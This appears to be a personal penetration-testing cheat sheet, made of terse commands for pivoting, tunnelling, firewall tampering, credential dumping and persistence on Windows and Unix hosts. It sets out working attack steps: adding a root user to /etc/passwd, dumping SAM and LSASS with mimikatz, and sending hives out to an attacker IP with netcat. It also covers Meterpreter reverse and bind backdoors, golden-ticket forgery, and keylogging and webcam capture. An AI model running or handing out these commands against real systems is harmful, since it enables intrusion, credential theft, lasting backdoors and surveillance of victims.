## File Transfer:

## Port Redirection & Tunneling:  

	Pivoting:
		*Use MSF portfwd when possible
		Within Meterpreter:  portfwd add -l <local port on the attacking machine (yours)> -p <victim port we want to access> -r <victim IP address>  ;  portfwd list  -  like SSH local forwarding  (help: portfwd -h)
			Forward:
				ex. portfwd add -L 127.0.0.1 -l 55555 -r 192.168.0.11 -p 55555
				ex. portfwd add -L 127.0.0.1 -l 2222 -r 192.168.200.69 -p 22 ; ssh user@localhost -p 2222
			Reverse (for intermediate reverse shell callback):  portfwd add -R -L 192.168.106.52 -l 9998 -p 9999  (reverse forward T2 9999 to T1 9998) (ran on T2)
				**portfwd add -R -L 127.0.0.1 -l RHP1 -r 192.168.106.52 -p RHP2  (run on meterp session of .106.52 box)
					**-r can be the listening box interface, or the box that will connect to it
				ex. portfwd add -R -L 127.0.0.1 -l 8888 [-r 192.168...] -p 9999    (forwards [192.168... interface on victim] 9999 to my 8888)
		run autoroute -s 10.1.13.0/24   -  then attack directly in MSF  (help: run autoroute -h)
		*Add Route (within MSF):  background; route add 192.168.0.0 255.255.255.0 <session_id>
		PSExec/PTH (port 445):  use exploit/windows/smb/psexec  \\  use admin/smb/psexec_command (stealthier)
			*Note: psexec uses powershell, so logging may be active; ****MAKE SURE TO USE PAYLOAD WITH PSEXEC--otherwise will try to connect directly to attack box
			Enable Firewall to Connect Back through:  run multicommand -cl 'cmd.exe /c netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'          
	Allow into Firewall:
	    Unix:
		sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.11.13 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
	    Windows:
		New Rule:  run multicommand -cl 'cmd.exe /c netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'
			Delete:  run multicommand -cl 'cmd.exe /c netsh advfirewall firewall delete rule name=RDP'
		Modify Existing Rule:  run multicommand -cl 'cmd.exe /c netsh advfirewall firewall set rule name=callforhelp new remoteip=any'
	Routing w/ Fpipe:
		upload /tmp/fpipe.exe c:/windows/temp/fp.exe
		run multicommand -cl 'cmd.exe /c netsh advfirewall firewall show rule profile=any name=all'
		execute -f c:/windows/temp/fp.exe -a '-l 3389 -r 22 192.168.200.69'
		run multicommand -cl 'cmd.exe /c netsh advfirewall firewall add rule name=3389 dir=in action=allow protocol=TCP localport=3389'
		-L 33389:172.17.20.10:3389
		ssh user@localhost -p 33389
	Routing w/ Portproxy:
		run multicommand -cl 'cmd.exe /c netsh interface portproxy set v4tov4 listenport=3389 connectaddress=192.168.200.69 connectport=22'
		run multicommand -cl 'cmd.exe /c netsh advfirewall firewall add rule name=3389 dir=in action=allow protocol=TCP localport=3389'
		ssh user@localhost -p 33389
		Or:  run post/windows/manage/portproxy ...
	*Remember to delete rule afterwards
	Routing w/ Iptables:
		-L8080:192.0.2.79:8080
		iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080 -j DNAT --to-destination 192.168.255.12:80
		If conntrack module is loaded, no need for a reversing rule
		echo 1 > /proc/sys/net/ipv4/ip_forward
		iptables -I RH-Firewall-1-INPUT 10 -p tcp --dport 80 -j ACCEPT
		iptables -t nat -A POSTROUTING -p tcp --dport 80 -d 192.168.255.12 -j SNAT --to-source 172.17.10.79
		nc -n 127.0.0.1 8080

## Active Directory:

## Persistence/Credentials:

    Unix:
        Add User:  echo root2:w08rKyoC9ECsg:0:0:/root:/bin/bash >> /etc/passwd     #password
        cat /etc/passwd /etc/shadow

    Windows:
        -Dumping SAM file (older systems)
        pwdump or fgdump: On Meterpreter:  upload /usr/share/windows-binaries/fgdump/fgdump.exe c:\\

        Mimikatz: pull credentials from memory
          in meterpreter:  execute -H -i -c -f /root/Desktop/Mimikatz/x64/mimikatz.exe -m


        Credentials:
            SAM Files:
                Dump (if admin):  reg save hklm\sam c:\sam, reg save hklm\system c:\system,  and transfer back:  nc64.exe 10.10.14.18 4445 < SAMS   ,  nc -nvlp 4445 > SAMS
                Decrypt (Unix):  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM [ip]
                Decrypt (Windows):  mimikatz.exe; privilege::debug; token::elevate; lsadump::sam filename1.hiv filename2.hiv
                Crack:  hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst
            MSF:  run post/windows/gather/hashdump
            Mimikatz:
                Local:  mimikatz.exe; privilege::debug; sekurlsa::logonpasswords full  \\  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
                    In Meterpreter:  load mimikatz; msv  \\  creds_all  \\  kerberos  \\  mimikatz_command -f samdump::hashes  \\  mimikatz_command -f sekurlsa::searchPasswords
                From LSASS dump:
                    from task manager  \\  procdump -ma lsass.exe lsass.dmp  \\  Import-Module .\OutMiniDump.ps1; Get-Process lsass | Out-Minidump (https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1)
                    mimikatz “sekurlsa::minidump C:\Users\username\AppData\Local\Temp\lsass.DMP”; sekurlsa::logonPasswords

        Add User:
            net user <username> <password> /add
            net localgroup Administrators <username> /add

        RDP:
            Enable RDP Access:
                reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
                netsh firewall set service remoteadmin enable
                netsh firewall set service remotedesktop enable
            Add RDP User (Windows):  net user <user> <pass> /add; net localgroup "Administrators" <USER> /add; net localgroup "Remote Desktop Users" <USER> /add


        Turn Off Firewall:
            Newer:  netsh advfirewall set allprofiles state off
            Older:  netsh firewall set opmode disable
        
        
        Windows:
	Modules: https://www.infosecmatter.com/post-exploitation-metasploit-modules-reference/
	PrivEsc:
	    getsystem
	    use priv
	    use post/multi/recon/local_exploit_suggester  ;  use exploit/windows/local/...
	Creds:
	    hashdump  \\  Better:  run hashdump \ run post/windows/gather/smart_hashdump ->**copy file to /tmp
		john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
		use auxiliary/analyze/jtr_crack_fast
	    GPO creds:  use post/windows/gather/credentials/gpp, set ... DOMAINS=BOOT SESSION=#
	    run credcollect
	    steal_token <PID> / drop_token
		Mimikatz:
			Option 1: load kiwi; creds_all  \\  creds_msv  \\  creds_kerberos   (require System)
			Option 2: load kiwi; kiwi_cmd "privilege::debug"; kiwi_cmd "sekurlsa::logonPasswords full"; kiwi_cmd "sekurlsa::credman"; kiwi_cmd "SEKURLSA::Kerberos"; kiwi_cmd "SEKURLSA::Krbtgt"; kiwi_cmd "SEKURLSA::SSP"; kiwi_cmd "SEKURLSA::Wdigest"
	Persistence:
	    Add User:  Local: run multicommand -cl "cmd.exe /c net user metasploit p@55w0rd /ADD","cmd.exe /c net localgroup 'Administrators' metasploit /ADD" ; Domain: run multicommand -cl "cmd.exe /c net user metasploit p@55w0rd /ADD /DOMAIN","cmd.exe /c net group "Domain Admins" metasploit /ADD /DOMAIN"
		Make Domain Admin:  run multicommand -cl 'cmd.exe /c net group "Domain admins" mossa /add /domain'; run multicommand -cl 'cmd.exe /c net group "Domain admins" /domain'
	    RDP:
		run post/windows/manage/enable_rdp username=admin,password=password
		    Or: run getgui -e  //  or  run getgui -u loneferret -p password  ;  then cleanup:  ex. run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
	    Telnet:  run gettelnet [-e  //  -u user -p pass]
	    Meterpreter Bind Backdoor:  run metsvc; use exploit/multi/handler; set PAYLOAD windows/metsvc_bind_tcp; set LPORT 31337; set RHOST 192.168.1.104; run
		Reverse Backdoor (reboot persistent):  run persistence -U -i 5 -p 443 -r 192.168.1.71; use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.71; set LPORT 443; exploit
	    Golden Ticket:  load kiwi;  golden_ticket_create -u mossa -d BOOT.LAB -k (krbtgt hash last half only) -s (Domain User SID w/o last 4 digits--from enum_users) -t /tmp/ticket
		kerberos_ticket_list; kerberos_ticket_use /tmp/ticket
	Hardware:
	    Clipboard:  load extapi; clipboard_get_data; clipboard_monitor_start; clipboard_monitor_dump
	    Keylogger:  keyscan_start; keyscan_stop; keyscan_dump  (after migrating to explorer)
	    webcam_list \ webcam_snap
	    screengrab
	    run vnc  -  opens quick viewing session
